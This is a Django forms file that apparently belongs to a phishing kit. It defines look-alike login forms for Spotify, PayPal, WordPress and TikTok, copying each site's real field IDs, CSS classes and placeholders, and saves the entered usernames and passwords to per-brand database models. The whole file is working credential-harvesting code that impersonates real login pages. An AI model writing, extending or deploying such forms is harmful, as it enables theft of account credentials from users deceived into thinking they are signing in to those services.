from django import forms
from . import models





        
class SpotifyForm(forms.ModelForm):
    class Meta:
        model = models.SpotifyModel
        fields = '__all__'
        widgets = {
            "username":forms.TextInput(attrs={
                "placeholder":"Email address or username",
                "required":"",
                "class":"form-control input-with-feedback ng-pristine ng-valid-sp-disallow-chars ng-empty ng-invalid ng-invalid-required ng-touched",
                "id":"login-username"}),
            
            "password":forms.PasswordInput(attrs={
                
                "id":"login-password",
                "class":"form-control input-with-feedback ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required",
                "required":"",
                "placeholder":"Password"})}
        
class PaypalForm(forms.ModelForm):
    class Meta:
        model = models.PaypalModel
        fields = '__all__'
        widgets = {
            "email":forms.EmailInput(attrs={
                "placeholder":"Email",
                "required":"",
                "class":"hasHelp  validateEmpty",
                "id":"email"}),
            
            "password":forms.PasswordInput(attrs={
                "id":"password",
                "class":"hasHelp  validateEmpty   pin-password",
                "required":"",
                "placeholder":"Password"})}

class WordPressForm(forms.ModelForm):
    class Meta:
        model = models.WordPressModel
        fields = '__all__'
        widgets = {
            "username":forms.TextInput(attrs={
                "required":"",
                "class":"input",
                "id":"user_login",
                "size":"20",
                "name":"log"}),
            
            "password":forms.PasswordInput(attrs={
                "id":"user_pass",
                "class":"input",
                "required":"",})}
  
  
class TiktokForm(forms.ModelForm):
    class Meta:
        model = models.TiktokModel
        fields = '__all__'
        widgets = {
            "username":forms.TextInput(attrs={
                "required":"",
                "class":"input-form input-command",
                "placeholder":"Username/Email/Phone"}),
            
            "password":forms.PasswordInput(attrs={
                "placeholder":"Password",
                "class":"input-form input-command",
                "required":"",})}      